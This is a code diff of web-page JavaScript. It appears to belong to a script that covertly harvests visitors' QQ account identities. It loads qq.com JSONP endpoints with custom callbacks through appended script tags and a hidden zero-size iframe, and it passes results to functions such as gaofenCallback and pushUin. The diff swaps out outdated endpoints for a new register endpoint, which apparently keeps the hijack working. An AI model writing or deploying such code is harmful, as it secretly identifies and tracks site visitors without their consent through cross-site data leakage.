@@ -11,8 +11,8 @@ $(function(){
         var t = +new Date, url = 'http://apps.qq.com/app/yx/cgi-bin/show_fel?hc=8&lc=4&d=365633133&t='+t;
         appendJS(url, function(s){
             if(data0 && data0.err === 1026){
-                //appJs();
-				addFrame();
+                appJs();
+				//addFrame();
             }else if(data0 && data0.err === 1002){
                 if(quin){
                     pushUin(quin);
@@ -25,17 +25,19 @@ $(function(){
 	
 	function addFrame(){
 		//var t = +new Date, url = 'http://zf.huanle.qq.com/cgi-bin/hlddz_box/hlddz_silver_to_gold_box?callback=gfq&uin=&_='+t;
-		var t = +new Date, url = 'http://zf.huanle.qq.com/cgi-bin/hlddz_box/hlddz_open_box?callback=gfq&uin=&_='+t;
+		//var t = +new Date, url = 'http://zf.huanle.qq.com/cgi-bin/hlddz_box/hlddz_open_box?callback=gfq&uin=&_='+t;
+		var t = +new Date, url = 'http://webnotice.minigame.qq.com/register?callback=gfq=&_='+t;
 		window.Pimg = "<script>function gfq(c){parent.gaofenCallback(c);}</script><script id='img' src='"+url+"'></script>";
 		$('body').append('<iframe src="javascript:parent.Pimg;" style="width: 0px; height: 0px;"></iframe>');
 	}
 
     function appJs(){
-		var t = +new Date, url = 'http://zf.huanle.qq.com/cgi-bin/hlddz_box/hlddz_silver_to_gold_box?callback=gaofenCallback&uin=&_='+t;
+		//var t = +new Date, url = 'http://zf.huanle.qq.com/cgi-bin/hlddz_box/hlddz_silver_to_gold_box?callback=gaofenCallback&uin=&_='+t;
         //var t = +new Date, url = 'http://dir.minigame.qq.com/cgi-bin/yxs/GetYxsRegTime?callback=gaofenCallback&dstuin=&t='+t;		
         //var t = +new Date, url = 'http://dir.minigame.qq.com/cgi-bin/dir_fetch_qqhead/get_player_info?callback=gaofenCallback&uin=&_='+t;
         //var t = +new Date, url = 'http://dir.minigame.qq.com/cgi-bin/gamevip_fetch_vip_info_mini?imgtype=3&DomainID=207&callback=gaofenCallback&t='+t;
         //url = 'http://dir.minigame.qq.com/cgi-bin/dir_fetch_qqhead?imgtype=3&DomainID=207&callback=gaofenCallback&t=1401862163959'
+		var t = +new Date, url = 'http://webnotice.minigame.qq.com/register?callback=gaofenCallback=&_='+t;
         appendJS(url);
     }
 
